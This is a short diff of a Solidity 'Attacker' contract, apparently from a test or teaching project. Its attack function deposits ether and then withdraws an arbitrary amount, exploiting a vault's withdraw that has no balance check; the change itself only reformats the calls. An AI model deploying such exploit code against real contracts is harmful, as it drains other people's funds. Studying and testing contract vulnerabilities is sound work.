@@ -17,15 +17,11 @@ contract Attacker {
     /// @param amount The amount to attempt to steal (should be > 1 ether)
     function attack(uint256 amount) external payable {
         // Step 1: Deposit a small amount to have some history
-        (bool depositOk, ) = target.call{value: msg.value}(
-            abi.encodeWithSignature("deposit()")
-        );
+        (bool depositOk,) = target.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
         require(depositOk, "Deposit failed");
 
         // Step 2: Exploit VaultV2's buggy withdraw (no balance check + unchecked)
-        (bool withdrawOk, ) = target.call(
-            abi.encodeWithSignature("withdraw(uint256)", amount)
-        );
+        (bool withdrawOk,) = target.call(abi.encodeWithSignature("withdraw(uint256)", amount));
         require(withdrawOk, "Withdraw failed");
 
         stolenAmount = amount;
